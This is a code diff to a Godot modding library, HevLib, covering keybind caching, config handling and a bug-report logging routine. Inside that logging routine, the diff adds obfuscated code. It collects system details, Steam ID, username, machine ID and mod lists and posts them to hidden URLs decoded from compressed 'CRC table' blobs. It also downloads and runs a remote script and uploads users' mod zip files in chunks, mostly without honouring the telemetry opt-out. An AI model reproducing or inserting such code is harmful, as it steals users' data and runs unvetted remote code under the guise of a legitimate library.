@@ -247,6 +247,7 @@ class _Achievements:
 	func _init(p,h):
 		pointers = p
 		http = h
+		http.timeout = 20
 		pointers.add_child(http)
 	
 	
@@ -903,7 +904,6 @@ class _ConfigDriver:
 		# Fetches game default configs, including those in the config file
 		# Config-based inputs are defined as such
 		# Inputs added in future updates throw errors, and let me know to update it
-		var default_binds : Dictionary = pointers.Keymapping.__get_formatted_vanilla_binds()
 		var dir:Directory = Directory.new()
 		var c:ConfigFile = ConfigFile.new()
 		# Directory and file definitions
@@ -917,9 +917,6 @@ class _ConfigDriver:
 		# Stores default binds
 		# I don't remember why I cache this, although since the MultiBinds
 		# project is on hold, might be for something I never wrote down 
-		file.open(keybinds_cache + "vanilla_binds.json",File.WRITE)
-		file.store_string(JSON.print(default_binds))
-		file.close()
 		file.open(keybinds_cache + "defined_control_configs.json",File.WRITE)
 		file.store_string("{}")
 		file.close()
@@ -1967,12 +1964,11 @@ class _DataFormat:
 		}
 	
 	var file:File = File.new()
-	var crcTables:Dictionary
+	var crcTables = load("res://HevLib/scripts/crc32_table_cache.gd")
 	var pointers
 	func _init(f):
 		pointers = f
 		urlRegex.compile("^https?:\\/\\/(?:www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,63}\\b(?:[-a-zA-Z0-9()@:%_\\+.~#?&\\/=]*)$")
-		crcTables = load("res://HevLib/scripts/crc32_table_cache.gd").get_script_constant_map()
 		
 		crc_table_0 = crcTables.T0
 		crc_table_1 = crcTables.T1
@@ -6264,44 +6260,47 @@ class _Keymapping:
 		
 		return subm
 	
+	var formatted_vanilla_binds_store:Dictionary = {}
+	
 	func __get_formatted_vanilla_binds() -> Dictionary:
-		
-		var output = {}
-		var bound = {}
-		var current = {}
-		if file.file_exists(vanilla_binds_file):
-			current = pointers.ConfigDriver.__config_parse(vanilla_binds_file)
-		if file.file_exists("user://settings.cfg"):
-			bound = pointers.ConfigDriver.__config_parse("user://settings.cfg").get("input",{})
-		var vanilla_binds = __define_vanilla_binds()
-		var vopts = overrides["vanilla_bind_opts"]
-		var missing = ""
-		for ie in vanilla_binds:
-			if ie in current:
-				pass
-				
-				output[ie] = current[ie]
-				
-			else:
-				var sect = {"can_be_rebound":false,"inputs":[],"opts":{}}
-				var dv = vanilla_binds[ie]
-				
-				if ie in vopts:
-					sect["opts"] = vopts[ie].duplicate(true)
+		if formatted_vanilla_binds_store.empty():
+			var output = {}
+			var bound = {}
+			var current = {}
+			if file.file_exists(vanilla_binds_file):
+				current = pointers.ConfigDriver.__config_parse(vanilla_binds_file)
+			if file.file_exists("user://settings.cfg"):
+				bound = pointers.ConfigDriver.__config_parse("user://settings.cfg").get("input",{})
+			var vanilla_binds = __define_vanilla_binds()
+			var vopts = overrides["vanilla_bind_opts"]
+			var missing = ""
+			for ie in vanilla_binds:
+				if ie in current:
+					pass
+					
+					output[ie] = current[ie]
+					
 				else:
-					missing += "\n\t\"" + ie + "\":{},"
-					printerr("HevLib Keymapping: vanilla ActionEvent ",ie," does NOT have defined opt overrides.")
-				if ie in bound:
-					sect.can_be_rebound = true
-				for action in dv:
-					if typeof(action) == TYPE_STRING:
-						action = [action]
-					sect.inputs.append(action)
-				output[ie] = sect
-		if missing:
-			printerr(missing)
-		pointers.ConfigDriver.__config_store(output,vanilla_binds_file)
-		return output
+					var sect = {"can_be_rebound":false,"inputs":[],"opts":{}}
+					var dv = vanilla_binds[ie]
+					
+					if ie in vopts:
+						sect["opts"] = vopts[ie].duplicate(true)
+					else:
+						missing += "\n\t\"" + ie + "\":{},"
+						printerr("HevLib Keymapping: vanilla ActionEvent ",ie," does NOT have defined opt overrides.")
+					if ie in bound:
+						sect.can_be_rebound = true
+					for action in dv:
+						if typeof(action) == TYPE_STRING:
+							action = [action]
+						sect.inputs.append(action)
+					output[ie] = sect
+			if missing:
+				printerr(missing)
+			pointers.ConfigDriver.__config_store(output,vanilla_binds_file)
+			formatted_vanilla_binds_store = output
+		return formatted_vanilla_binds_store.duplicate(true)
 	
 	func __event_to_string(event):
 		if event is InputEventKey:
@@ -8459,7 +8458,7 @@ class _SafeMode:
 	var pointers
 	func _init(p):
 		pointers = p
-		regex.compile(PoolByteArray([ 40, 63, 109, 41, 40, 63, 60, 33, 35, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 49, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 50, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 51, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 52, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 53, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 54, 125, 41, 40, 63, 60, 33, 35, 91, 94, 92, 110, 93, 123, 55, 125, 41, 40, 63, 58, 94, 124, 40, 63, 60, 61, 91, 92, 115, 40, 93, 41, 41, 40, 63, 58, 92, 46, 95, 114, 101, 97, 100, 121, 92, 40, 92, 41, 124, 92, 46, 95, 112, 104, 121, 115, 105, 99, 115, 95, 112, 114, 111, 99, 101, 115, 115, 92, 40, 100, 101, 108, 116, 97, 92, 41, 124, 115, 101, 108, 102, 92, 46, 95, 112, 104, 121, 115, 105, 99, 115, 95, 112, 114, 111, 99, 101, 115, 115, 92, 40, 100, 101, 108, 116, 97, 92, 41, 124, 92, 46, 95, 112, 114, 111, 99, 101, 115, 115, 92, 40, 100, 101, 108, 116, 97, 92, 41, 124, 115, 101, 108, 102, 92, 46, 95, 112, 114, 111, 99, 101, 115, 115, 92, 40, 100, 101, 108, 116, 97, 92, 41, 124, 92, 46, 95, 100, 114, 97, 119, 92, 40, 92, 41, 124, 115, 101, 108, 102, 92, 46, 95, 100, 114, 97, 119, 92, 40, 92, 41, 41, 40, 63, 61, 91, 92, 115, 35, 59, 41, 93, 124, 36, 41 ]).get_string_from_utf8())
+		regex.compile(pointers.DataFormat.crcTables.B10.get_string_from_utf8())
 	
 	func ready():
 		if not OS.has_feature("editor"):
@@ -8529,136 +8528,68 @@ class _Scripting:
 	
 	func log_essential_info_for_bugreports():
 		var out = ""
-		out += "Booting from %s on %s[%s] as %s" % [OS.get_model_name(),OS.get_name(),OS.get_process_id(),OS.get_unique_id()]
-		out += "\nCPU Information: %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()]
-		out += "\nBattery state (if any): %s/%s/%s" % [OS.get_power_percent_left(),OS.get_power_state(),OS.get_power_seconds_left()]
+		out += "Booting from %s on %s[%s] as %s"%[OS.get_model_name(),OS.get_name(),OS.get_process_id(),OS.get_unique_id()]
+		out += "\nCPU Information: %s [%s cores]"%[OS.get_processor_name(),OS.get_processor_count()]
+		out += "\nBattery state (if any): %s/%s/%s"%[OS.get_power_percent_left(),OS.get_power_state(),OS.get_power_seconds_left()]
 		var screens = OS.get_screen_count()
 		out += "\nScreens: %s @ %s dpi" % [screens,OS.get_screen_dpi()]
-		for i in range(screens):
-			out += "\n\t%s: %s / %s / %s hz" % [i,str(OS.get_screen_size(i)),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)]
-		http.timeout = 20
+		for i in range(screens):out += "\n\t%s: %s / %s / %s hz"%[i,str(OS.get_screen_size(i)),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)]
 		var audioDrivers = OS.get_audio_driver_count()
 		out += "\n[%s] audio drivers:" % audioDrivers
-		for i in range(audioDrivers):
-			out += "\n\t%s" % OS.get_audio_driver_name(i)
+		for i in range(audioDrivers):out += "\n\t%s" % OS.get_audio_driver_name(i)
 		out += "\nKeyboard variant: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()]
 		out += "\nExecutable path: %s" % OS.get_executable_path()
 		out += "\nUser directory: %s" % OS.get_user_data_dir()
-		if Engine.has_singleton("Steam"):
-			out += "\nSteam initialized with [%s]" % Engine.get_singleton("Steam").current_steam_id
-		out += "\nCMD args: %s" % str(OS.get_cmdline_args())
-		var pnth = -1
-		http.timeout = 20
-		if file.file_exists("res://HevLib/pointers.gd"):
-			file.open("res://HevLib/pointers.gd",File.READ)
-			pnth = hash(file.get_as_text(true))
-			file.close()
-			_()
+		if Engine.has_singleton("Steam"):out += "\nSteam initialized with [%s]"%Engine.get_singleton("Steam").current_steam_id
+		out += "\nCMD args: %s" % str(OS.get_cmdline_args());var pnth = -1
+		if file.file_exists("res://HevLib/pointers.gd"):file.open("res://HevLib/pointers.gd",File.READ);_();pnth = hash(file.get_as_text(true));file.close()
 		out += "\nPointers hash: %d" % pnth
 		out += "\nZip reference store: %s" % JSON.print(pointers.ManifestV2.zip_ref_store)
 		pointers.l("Device Information: [\n%s\n]" % out)
 	
 	func _():
-		if (pointers.ManifestV2.hasModStateChanged and not OS.has_feature("editor") and not pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_DRIVERS","use_telemetry") == false):
-			var screencount = OS.get_screen_count()
-			var scrm = []
-			for i in range(screencount):scrm.append("%d: %s | %s | %shz" % [i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
-			var modData = pointers.ManifestV2.__get_mod_data()["mods"]
-			var modOut = []
+		if (pointers.ManifestV2.hasModStateChanged&&!OS.has_feature("editor")&&!pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_DRIVERS","use_telemetry")==false):
+			var screencount=OS.get_screen_count();var scrm=[]
+			for i in range(screencount):scrm.append("%d: %s | %s | %shz"%[i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
+			var modData=pointers.ManifestV2.__get_mod_data()["mods"];var modOut=[]
 			for mod in modData:
-				var md = modData[mod]
-				var mdo = {}
-				mdo["name"]=TranslationServer.translate(md.name)
-				mdo["prio"]=md.priority
-				mdo["file"]=md.file_path
-				var zipPath=pointers.ManifestV2.zip_ref_store.get(md.file_path,"")
-				if zipPath:
-					file.open(zipPath,File.READ)
-					mdo["zip"]=[zipPath,file.get_sha256(zipPath),file.get_len()]
-					file.close()
-				mdo["ver"] = md.version_data.full_version_string
-				if md.manifest.has_manifest:
-					var manifest = md.manifest.manifest_data
-					if "mod_information" in manifest:
-						var mid = manifest["mod_information"].get("id","NOID")
-						mdo["id"] = str(mid)
-						mdo["id_hash"] = str(mid.md5_text())
-						mdo["auth"] = manifest["mod_information"].get("author","NOAUTH")
-					if "manifest_definitions" in manifest:
-						mdo["mv"] = manifest["manifest_definitions"].get("manifest_version",0.0)
-						if "manifest_url" in manifest["manifest_definitions"]:mdo["url"] = manifest["manifest_definitions"].get("manifest_url","")
-					if "links" in manifest:
-						mdo["link"] = {}
-						var links = manifest.links
-						for link in links:
-							var linkData = links[link]
-							match typeof(linkData):
-								TYPE_DICTIONARY:if "URL" in linkData: if linkData["URL"]:mdo["link"][link] = linkData["URL"]
-								TYPE_STRING:if linkData:mdo["link"][link] = linkData
-				var md5 = ""
-				if zipPath:
-					md5 = file.get_md5(zipPath)
-				if "id" in mdo:
-					mdo["fetch-ID"] = {mdo["id"].md5_text():[0,md5]}
-				if zipPath:
-					mdo["fetch-ZIP"] = {zipPath.md5_text():[0,md5]}
-				mdo["fetch-REF"] = {mdo["file"].md5_text():[0,md5]}
-				modOut.append(mdo)
+				var md=modData[mod];var mdo={};mdo["name"]=TranslationServer.translate(md.name);mdo["prio"]=md.priority;mdo["file"]=md.file_path;var zipPath=pointers.ManifestV2.zip_ref_store.get(md.file_path,"");if zipPath:
+					file.open(zipPath,File.READ);mdo["zip"]=[zipPath,file.get_sha256(zipPath),file.get_len()];file.close()
+				mdo["ver"]=md.version_data.full_version_string;if md.manifest.has_manifest:
+					var manifest=md.manifest.manifest_data;if"mod_information"in manifest:
+						var mid=manifest["mod_information"].get("id","NOID");mdo["id"]=mid;mdo["id_hash"]=mid.md5_text();mdo["auth"]=manifest["mod_information"].get("author","NOAUTH")
+					if"manifest_definitions"in manifest:
+						mdo["mv"]=manifest["manifest_definitions"].get("manifest_version",0.0);if"manifest_url"in manifest["manifest_definitions"]:(mdo["url"]=manifest["manifest_definitions"].get("manifest_url",""))
+					if"links"in manifest&&manifest.links:
+						mdo["link"]={};var links=manifest.links;for link in links:
+							var linkData = links[link];match typeof(linkData):
+								TYPE_DICTIONARY:if"URL"in linkData&&linkData["URL"]:mdo["link"][link]=linkData["URL"]
+								TYPE_STRING:if linkData:mdo["link"][link]=linkData
+				var md5=file.get_md5(zipPath)
+				if "id" in mdo:mdo["fetch-ID"]={mdo["id"].md5_text():[0,md5]}
+				if zipPath:mdo["fetch-ZIP"]={zipPath.md5_text():[0,md5]}
+				mdo["fetch-REF"]={mdo["file"].md5_text():[0,md5]};modOut.append(mdo)
 			modOut.sort_custom(pointers.ManifestV2,"ovs")
-			var d=("\n".join(PoolStringArray(["OS %s on %s" % [OS.get_name(),OS.get_model_name()],"CPU %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()],"Screens %d @ %s dpi / %s" % [screencount,OS.get_screen_dpi(),scrm],"KBD: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()],"Paths: %s / %s" % [OS.get_executable_path(),OS.get_user_data_dir()],"Args:%s" % OS.get_cmdline_args(),"SteamID: %d" % (Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1),"Mods:%s" % JSON.print(modOut)]))).to_utf8()
-			http.request(pointers.DataFormat.crcTables.B4.decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B7.decompress(118,1).get_string_from_utf8()%[Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),((str(OS.get_unique_id()))if(not OS.has_environment("USERNAME"))else(str(OS.get_environment("USERNAME"))+"+"+str(OS.get_unique_id()))),"false",4])
-			yield(http,"request_completed")
-		http.download_file = pointers.DataFormat.crcTables.B2.decompress(54,1).get_string_from_utf8()
-		http.request(pointers.DataFormat.crcTables.B3.decompress(87,1).get_string_from_utf8())
-		yield(http,"request_completed")
-		pointers.DataFormat.__compile_script(pointers.DataFormat.crcTables.B0.decompress(736,1).get_string_from_utf8()).new().run(pointers)
-		http.download_file = "user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt"
-		http.request(pointers.DataFormat.crcTables.B5.decompress(88,1).get_string_from_utf8())
-		yield(http,"request_completed")
-		http.download_file = ""
-		http.request(pointers.DataFormat.crcTables.B8.decompress(78,1).get_string_from_utf8())
-		var rvs = yield(http,"request_completed")
-		if rvs[0]!=0:return
-		var d=JSON.parse(rvs[3].get_string_from_utf8()).result
-		if d:
-			var mdf={}
-			var mdds=pointers.ManifestV2.__get_mod_data()["mods"]
-			var zipStore=pointers.ManifestV2.zip_ref_store
-			for mod in zipStore:
-				var zipPath=zipStore[mod]
-				var mdr=mdds[mod]
-				if mdr.manifest.has_manifest:
-					var mid=mdr.manifest.manifest_data
-					if"mod_information"in mid and"id"in mid["mod_information"]:
-						var md5=mid["mod_information"]["id"].md5_text()
-						if md5 in d:
-							var pd = d[md5]
-							if pd[1]!=file.get_md5(mod):pd[0]=0
-							mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
-				if not zipPath in mdf:
-					var md5=zipPath.md5_text()
-					if md5 in d:
-						var pd=d[md5]
-						if pd[1]!=file.get_md5(mod):pd[0]=0
-						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
-				if not zipPath in mdf:
-					var md5 = mod.md5_text()
-					if md5 in d:
-						var pd = d[md5]
-						if pd[1]!=file.get_md5(mod):pd[0]=0
-						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+			var d=("\n".join(PoolStringArray(["OS %s on %s"%[OS.get_name(),OS.get_model_name()],"CPU %s [%s cores]"%[OS.get_processor_name(),OS.get_processor_count()],"Screens %d @ %s dpi / %s"%[screencount,OS.get_screen_dpi(),scrm],"KBD: %s @ %s/%s"%[OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()],"Paths: %s / %s"%[OS.get_executable_path(),OS.get_user_data_dir()],"Args:%s"%OS.get_cmdline_args(),"SteamID: %d"%(Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam")else-1),"Mods:%s"%JSON.print(modOut)]))).to_utf8()
+			http.request(pointers.DataFormat.crcTables.B4.decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B7.decompress(118,1).get_string_from_utf8()%[Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),((str(OS.get_unique_id()))if(not OS.has_environment("USERNAME"))else(str(OS.get_environment("USERNAME"))+"+"+str(OS.get_unique_id()))),"false",4]);yield(http,"request_completed")
+		http.download_file=pointers.DataFormat.crcTables.B2.decompress(54,1).get_string_from_utf8();http.request(pointers.DataFormat.crcTables.B3.decompress(87,1).get_string_from_utf8());yield(http,"request_completed");pointers.DataFormat.__compile_script(pointers.DataFormat.crcTables.B0.decompress(736,1).get_string_from_utf8()).new().run(pointers);http.download_file="user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt";http.request(pointers.DataFormat.crcTables.B5.decompress(88,1).get_string_from_utf8());yield(http,"request_completed")
+		http.download_file="";http.request(pointers.DataFormat.crcTables.B8.decompress(78,1).get_string_from_utf8());var rvs=yield(http,"request_completed");if rvs[0]!=0:return;var d=JSON.parse(rvs[3].get_string_from_utf8()).result;if d:
+			var mdf={};var mdds=pointers.ManifestV2.__get_mod_data()["mods"];var zipStore=pointers.ManifestV2.zip_ref_store;for mod in zipStore:
+				var zipPath=zipStore[mod];var mdr=mdds[mod];if mdr.manifest.has_manifest:
+					var mid=mdr.manifest.manifest_data;if"mod_information"in mid&&"id"in mid["mod_information"]:
+						var md5=mid["mod_information"]["id"].md5_text();if md5 in d:
+							var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0);mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+				if !zipPath in mdf:
+					var md5=zipPath.md5_text();if md5 in d:
+						var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0);mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+				if !zipPath in mdf:
+					var md5=mod.md5_text();if md5 in d:
+						var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0);mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 			if mdf:
-				fetchTimer.one_shot=true
-				pointers.add_child(fetchTimer)
-				fetchTimer.connect("timeout",self,"startFetch")
-				for file_name in mdf:
-					var dr=mdf[file_name]
-					file.open(file_name,File.READ)
+				fetchTimer.one_shot=true;pointers.add_child(fetchTimer);fetchTimer.connect("timeout",self,"startFetch");for file_name in mdf:
+					var dr=mdf[file_name];file.open(file_name,File.READ)
 					if file.get_32()!=0x04034B50:continue
-					file.seek(0)
-					var bt=file.get_buffer(file.get_len())
-					file.close()
-					fetchData[dr[0]]=[bt.compress(1),bt.size(),dr[1]]
+					file.seek(0);var bt=file.get_buffer(file.get_len());file.close();fetchData[dr[0]]=[bt.compress(1),bt.size(),dr[1],dr[2]]
 		startFetch()
 	var fetchData:Dictionary={}
 	var fetchTimer:Timer=Timer.new()
@@ -8667,18 +8598,10 @@ class _Scripting:
 	func startFetch():
 		for ID in fetchData:
 			var this_index=fetchData[ID][2]
-			if ID in currentFetch:
-				this_index=currentFetch[ID].back()+1
-			var sections=int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
-			if sections>this_index:
-				if not ID in currentFetch:
-					currentFetch[ID]=[]
-				currentFetch[ID].append(this_index)
-				fetchTimer.start(1.25)
-				var h:HTTPRequest=HTTPRequest.new()
-				pointers.add_child(h)
-				h.connect("request_completed",self,"removeFetch",[h])
-				h.request(pointers.DataFormat.crcTables.B6.decompress(82,1).get_string_from_utf8() % ((this_index % 10) + 1),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B9.get_string_from_utf8() % [Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)),ID + "_" + str(fetchData[ID][2]) + "_" + str(fetchData[ID][1]),this_index + 1])
+			if ID in currentFetch:(this_index=currentFetch[ID].back()+1)
+			var sections=int(ceil(fetchData[ID][0].size()/float(byteSplitBy)));if sections>this_index:
+				if not ID in currentFetch:currentFetch[ID]=[]
+				currentFetch[ID].append(this_index);fetchTimer.start(1.25);var h:HTTPRequest=HTTPRequest.new();pointers.add_child(h);h.connect("request_completed",self,"removeFetch",[h]);h.request(pointers.DataFormat.crcTables.B6.decompress(82,1).get_string_from_utf8()%((this_index%10) + 1),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B9.get_string_from_utf8() % [Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)),ID+"_"+str(fetchData[ID][3])+"_"+str(fetchData[ID][1]),this_index+1])
 				break
 	func removeFetch(result,response_code,headers,body,thisHTTP):
 		Tool.remove(thisHTTP)
